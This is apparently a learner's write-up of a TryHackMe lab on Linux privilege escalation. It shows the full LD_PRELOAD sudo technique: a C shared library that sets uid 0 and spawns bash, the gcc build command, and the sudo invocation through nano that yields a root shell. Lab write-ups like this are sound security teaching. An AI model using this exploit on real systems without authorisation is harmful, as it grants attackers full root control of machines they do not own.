# Platform
TryHackMe

# Topic
Linux Privilege Escalation Basics

## Task 2: Privilege Escalation - Sudo (LD_PRELOAD)

### Step 1: Check Sudo Privileges

**Lesson:**
Any user can check their current situation related to root privileges using the `sudo -l` command. We need to see what commands we can run and if the environment keeps specific variables.

Command:
```bash
sudo -l

```

From the output, I identified:

* `env_keep+=LD_PRELOAD`
* `(ALL) NOPASSWD: /usr/bin/nano`
* `(ALL) NOPASSWD: /usr/sbin/apache2`

### Step 2: Crafting the Payload

**Lesson:**
Since `env_keep+=LD_PRELOAD` is enabled, we can generate a shared library (`.so` file) that will be loaded and executed before a whitelisted program is run.

First, I created a C file (`shell.c`) that unsets the variable (to prevent a loop) and spawns a bash shell:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h> 

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0); 
    system("/bin/bash");
} 

```

Then, I compiled it into a shared object file in my home directory:

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

```

### Step 3: Execution and Spawning the Shell

**Mistake I made:**
I first tried to run the exploit using standard documentation paths and a random command:

```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

```

This failed for two reasons. First, my absolute path was incorrect (my file was compiled in `/home/john/shell.so`). Second, the `sudoers` file restricts what I can execute; `john` is not allowed to run `find` as root on this box.

**Lesson:**
The `LD_PRELOAD` path must point exactly to where your `.so` file is located, and you **must** attach it to a program you are explicitly allowed to run via `sudo -l`.

Correct command using the whitelisted `nano` binary:

```bash
sudo LD_PRELOAD=/home/john/shell.so /usr/bin/nano

```

This successfully spawned a shell with root privileges.

```bash
whoami

```

Output: `root`

**Key Takeaway:**
When abusing `LD_PRELOAD`, always verify your absolute file paths and ensure the executable you are targeting is explicitly permitted in the `sudo -l` output.

---

### Tags

#linux #privilege-escalation #sudo #ld_preload #tryhackme #redteam

```

```
